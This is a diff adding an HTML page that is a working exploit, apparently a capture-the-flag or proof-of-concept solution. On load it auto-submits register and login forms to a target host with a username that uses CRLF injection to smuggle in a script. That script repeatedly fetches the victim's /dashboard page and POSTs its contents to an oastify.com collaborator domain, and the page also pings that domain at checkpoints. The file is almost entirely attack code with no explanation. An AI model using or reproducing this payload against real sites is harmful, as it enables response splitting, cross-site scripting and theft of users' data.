@@ -1,0 +1,66 @@
+<html>
+<head></head>
+<body>
+<script>
+    let host = "web";
+    let username = "1:1\r\n\r\n";
+    username += `\x3chtml>
+\x3chead></head>
+\x3cbody>poc
+\x3cscript>
+setInterval(async function() {
+    const resp = await fetch("/dashboard");
+    const data = await resp.text();
+    await fetch("http://cgwjem81pxsk12rybbujzcvir9x0lq9f.oastify.com", {
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        body: "data=".concat(encodeURIComponent(data)),
+    });
+}, 500);
+\x3c/script>
+\x3c/body>
+\x3c/html>
+\x3c!--
+`.replace(/\n/g, "\r\n");
+
+    const createInput = (name, value) => {
+        const input = document.createElement("input");
+        input.type = "hidden";
+        input.name = name;
+        input.value = value;
+        return input;
+    };
+
+    setTimeout(() => {
+        console.log("register...");
+        const form = document.createElement("form");
+        form.method = "POST";
+        form.target = "_blank";
+        form.action = `http://${host}/register`;
+        form.appendChild(createInput("username", username));
+        form.appendChild(createInput("password", "password"));
+        document.body.appendChild(form);
+        form.submit();
+        fetch("https://cgwjem81pxsk12rybbujzcvir9x0lq9f.oastify.com/checkpoint1");
+    }, 1000);
+
+    setTimeout(() => {
+        console.log("login...");
+        const form = document.createElement("form");
+        form.method = "POST";
+        form.target = "_blank";
+        form.action = `http://${host}/login`;
+        form.appendChild(createInput("username", username));
+        form.appendChild(createInput("password", "password"));
+        document.body.appendChild(form);
+        form.submit();
+        fetch("https://cgwjem81pxsk12rybbujzcvir9x0lq9f.oastify.com/checkpoint2");
+    }, 2500);
+
+    setTimeout(() => {
+        window.open(`http://${host}/dashboard`, "_blank");
+        fetch("https://cgwjem81pxsk12rybbujzcvir9x0lq9f.oastify.com/checkpoint3");
+    }, 4000);
+</script>
+</body>
+</html>
